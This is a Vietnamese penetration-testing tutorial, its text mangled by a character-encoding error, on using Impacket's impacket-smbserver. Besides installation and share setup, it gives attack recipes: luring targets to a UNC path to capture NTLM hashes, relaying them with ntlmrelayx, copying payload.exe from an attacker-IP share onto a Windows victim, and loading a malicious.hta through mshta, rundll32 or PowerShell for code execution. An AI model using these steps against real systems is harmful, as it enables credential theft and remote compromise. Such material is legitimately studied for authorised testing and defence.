âœ… 1. Giá»›i thiá»‡u impacket-smbserver lÃ  gÃ¬?

impacket-smbserver lÃ  má»™t tiá»‡n Ã­ch trong bá»™ cÃ´ng cá»¥ Impacket cho phÃ©p báº¡n dá»±ng má»™t SMB server giáº£ láº­p (chia sáº» thÆ° má»¥c Windows) Ä‘á»ƒ:

    Chia sáº» file tá»« Linux sang mÃ¡y Windows qua SMB.

    Dáº«n dá»¥ má»¥c tiÃªu thá»±c hiá»‡n káº¿t ná»‘i Ä‘á»ƒ Ä‘Ã¡nh cáº¯p NTLM hash.

    Há»— trá»£ file transfer trong quÃ¡ trÃ¬nh pentest.

    Káº¿t há»£p vá»›i cÃ¡c cÃ´ng cá»¥ nhÆ° Responder, Inveigh, CrackMapExec, NTLMRelayx, v.v.

âœ… 2. CÃ i Ä‘áº·t Impacket

TrÃªn Kali Linux hoáº·c Ubuntu:

sudo apt install impacket-scripts

Hoáº·c clone báº£n má»›i nháº¥t tá»« GitHub:

git clone https://github.com/fortra/impacket.git
cd impacket
python3 -m pip install .

âœ… 3. Sá»­ dá»¥ng cÆ¡ báº£n
ğŸš© Dá»±ng má»™t SMB share Ä‘Æ¡n giáº£n:

sudo impacket-smbserver SHARE_NAME /path/to/share

ğŸ“Œ VÃ­ dá»¥:

sudo impacket-smbserver share /home/khang/share-folder

MÃ¡y Windows cÃ³ thá»ƒ truy cáº­p:

\\<IP-LINUX>\share

âœ… 4. ThÃªm tÃ¹y chá»n nÃ¢ng cao
ğŸ“Œ -smb2support

Há»— trá»£ giao thá»©c SMBv2:

sudo impacket-smbserver share /home/khang/share-folder -smb2support

ğŸ“Œ -username & -password

ThÃªm xÃ¡c thá»±c khi truy cáº­p:

sudo impacket-smbserver share /home/khang/share-folder -username admin -password 123456

ğŸ“Œ Ghi log káº¿t ná»‘i:

DÃ¹ng tcpdump hoáº·c Wireshark lá»c tcp.port == 445 Ä‘á»ƒ xem SMB traffic.
âœ… 5. Má»™t sá»‘ tÃ¬nh huá»‘ng sá»­ dá»¥ng thá»±c táº¿
âš”ï¸ TÃ¬nh huá»‘ng 1: Dáº«n dá»¥ má»¥c tiÃªu káº¿t ná»‘i tá»›i SMB server Ä‘á»ƒ Ä‘Ã¡nh cáº¯p NTLM hash

    Dá»±ng server:

sudo impacket-smbserver share /tmp -smb2support

    Gá»­i Ä‘áº¿n má»¥c tiÃªu má»™t Ä‘Æ°á»ng dáº«n UNC:

\\<YOUR-IP>\share

    Khi má»¥c tiÃªu click vÃ o Ä‘Æ°á»ng dáº«n hoáº·c á»©ng dá»¥ng cá»‘ táº£i file, nÃ³ sáº½ tá»± Ä‘á»™ng gá»­i NTLM hash Ä‘áº¿n báº¡n.

Káº¿t há»£p vá»›i Responder hoáº·c ntlmrelayx Ä‘á»ƒ khai thÃ¡c thÃªm.
âš”ï¸ TÃ¬nh huá»‘ng 2: Chuyá»ƒn file tá»« Kali sang mÃ¡y náº¡n nhÃ¢n (reverse shell, payload, v.v.)

    Dá»±ng server chia sáº» thÆ° má»¥c chá»©a payload:

sudo impacket-smbserver evil /home/kali/payloads -smb2support

    TrÃªn mÃ¡y má»¥c tiÃªu (Windows):

copy \\<ATTACKER-IP>\evil\payload.exe C:\Users\Public\

âš”ï¸ TÃ¬nh huá»‘ng 3: DÃ¹ng trong khai thÃ¡c RCE

Náº¿u má»¥c tiÃªu cÃ³ chá»— táº£i file tá»« UNC path (nhÆ° upload UNC), báº¡n cÃ³ thá»ƒ:

\\<attacker-ip>\share\malicious.hta

Káº¿t há»£p vá»›i mshta.exe, rundll32.exe, hoáº·c powershell.exe.
âœ… 6. Káº¿t há»£p vá»›i ntlmrelayx

ntlmrelayx.py -smb2support -smb2support -t smb://<target> --smb2support

impacket-smbserver thÆ°á»ng Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ dáº«n dá»¥, cÃ²n ntlmrelayx lÃ  bÃªn relay sang má»¥c tiÃªu.
âœ… 7. Gá»¡ lá»—i & lÆ°u Ã½

    Firewall cÃ³ thá»ƒ cháº·n port 445 â‡’ má»Ÿ hoáº·c bypass.

    Sá»­ dá»¥ng Wireshark Ä‘á»ƒ debug SMB traffic.

    Äáº£m báº£o cÃ³ quyá»n root (SMB sá»­ dá»¥ng port < 1024).

âœ… 8. Tá»•ng káº¿t
Má»¥c Ä‘Ã­ch	Lá»‡nh
Dá»±ng share SMB Ä‘Æ¡n giáº£n	impacket-smbserver share /folder
Há»— trá»£ SMBv2	-smb2support
ThÃªm user/pass	-username user -password pass
Phishing NTLM	DÃ¹ng UNC \\ip\share
Chuyá»ƒn file	Copy tá»« UNC path
